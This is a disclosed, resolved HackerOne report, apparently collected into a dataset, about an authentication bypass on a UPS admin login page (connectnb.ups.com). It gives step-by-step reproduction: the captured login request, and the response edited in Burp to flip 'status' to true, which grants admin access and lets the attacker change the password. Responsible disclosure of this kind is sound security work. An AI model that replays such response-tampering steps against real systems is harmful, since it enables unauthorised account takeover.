---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1490470'
original_report_id: '1490470'
title: Admin Authentication Bypass Lead to Admin Account Takeover
weakness: Improper Authentication - Generic
team_handle: ups
created_at: '2022-02-24T04:34:20.935Z'
disclosed_at: '2022-06-20T00:18:15.085Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 80
asset_identifier: '*.ups.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- improper-authentication-generic
---

# Admin Authentication Bypass Lead to Admin Account Takeover

## Metadata

- HackerOne Report ID: 1490470
- Weakness: Improper Authentication - Generic
- Program: ups
- Disclosed At: 2022-06-20T00:18:15.085Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello Team

I found that i can bypass the login page of the Admin account by intercepting the respone of the login request of ```connectnb.ups.com``` subdomain and change ```status``` from ```false``` to ```true```

## Steps To Reproduce:

  1. Open ```https://connectnb.ups.com/Layout/login```
  2. Enter ```Admin``` as a Username  and ```1111``` as a password 

{F1631133}

  3. Press log in and Intercept the request in Burp
```
POST /api/Account/Login/ HTTP/2
Host: connectnb.ups.com
Cookie: __RequestVerificationToken=QebkjA4fUWqs_x5SlBpsNQLJfA_U-PO9D27S5PJ8o4WoQ7I7inEZxzHFoQ4huXpUb9jeC8L-JusQF0PU18M73AyQ-xH2jF4hJVYtxbOe5lQ1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 38
Origin: https://connectnb.ups.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"UserName":"admin","Password":"1111"}
```

  4. Intercept the response for this request in Burp by >> ```Do Intercept >>Response to this request``` and then Forward this request
  5. Change ```status``` value from ```false``` to ```true``` and Forward the request

```
HTTP/2 200 OK
Cache-Control: no-cache,no-cache,no-store
Pragma: no-cache,no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: 
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains;preload
X-Frame-Options: DENY
X-Ua-Compatible: IE=Edge
Content-Security-Policy: script-src 'self'; object-src 'self'; frame-ancestors 'none'
Expect-Ct: enforce, max-age=7776000, report-uri='https://connectnb.ups.com/'
Access-Control-Allow-Origin: https://connectnb.ups.com/
Access-Control-Allow-Headers: Accept, Content-Type, Origin
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Date: Thu, 24 Feb 2022 03:59:01 GMT
Content-Length: 71

{"status":true,"errorMessage":"Username and Password does not match."}
```


  6. Now open ```Report``` , ```Change Password``` and  ```Process Return``` and then Turn off the intercept of the Burp

{F1631144}
{F1631140}
{F1631141}

## Supporting Material/References:

POC Video

{F1631161}

## Impact

The attacker can 
- login as an admin by bypassing the authentication  
- change the admin password to takeove the admin account
- View the company's reports and delete them [1066 Report]
- View processReturn

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
